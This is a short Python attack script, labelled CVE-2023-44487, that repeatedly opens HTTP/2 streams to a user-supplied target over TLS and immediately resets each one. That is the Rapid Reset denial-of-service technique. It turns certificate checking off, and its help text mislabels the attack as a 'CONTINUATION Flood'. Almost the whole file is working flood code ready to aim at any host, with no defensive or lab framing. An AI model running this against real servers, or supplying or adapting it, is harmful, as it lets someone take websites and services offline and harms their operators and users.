#CVE-2023-44487
#!/usr/bin/env python3

import argparse
import socket
import ssl
import certifi

import h2.connection
import h2.events


def http2_attack(ip_dst, counter):
    port_dst = 443

    # generic socket and ssl configuration
    socket.setdefaulttimeout(15)
    ctx = ssl.create_default_context(cafile=certifi.where())
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])

    # open a socket to the server and initiate TLS/SSL
    s = socket.create_connection((ip_dst, port_dst))
    s = ctx.wrap_socket(s, server_hostname=ip_dst)

    c = h2.connection.H2Connection()
    c.initiate_connection()
    s.sendall(c.data_to_send())

    headers = [
        (':method', 'GET'),
        (':path', '/'),
        (':authority', ip_dst),
        (':scheme', 'https')
    ]
    #data_to_send = b"hello~~~"

    for i in range(0, counter):
    #while True:
        stream_id = c.get_next_available_stream_id()
        #print(stream_id)
        c.send_headers(stream_id, headers, end_stream=True)
        #c.send_data(stream_id, data_to_send)
        #c.end_stream(stream_id)
        s.sendall(c.data_to_send())
        c.reset_stream(stream_id)
        s.sendall(c.data_to_send())
    print(f"send total {counter} stream")
    # tell the server we are closing the h2 connection
    c.close_connection()
    s.sendall(c.data_to_send())

    # close the socket
    s.close()

def main():
    parser = argparse.ArgumentParser(description = "HTTP/2 CONTINUATION Flood")
    parser.add_argument('-ti', '--target_ip', help='Specify the target IP or Domain. e.g. 127.0.0.1', required=True)
    #parser.add_argument('-tp', '--target_port', help="Specify the targrt's port", required=True)
    parser.add_argument('-c', '--count', help="Specify the number of packets that you want to send", required=True)

    arg = parser.parse_args()

    ip_dst = arg.target_ip
    #port_dst = int(arg.target_port)
    counter = int(arg.count)

    http2_attack(ip_dst, counter)

if __name__ == '__main__':
    main()
                    
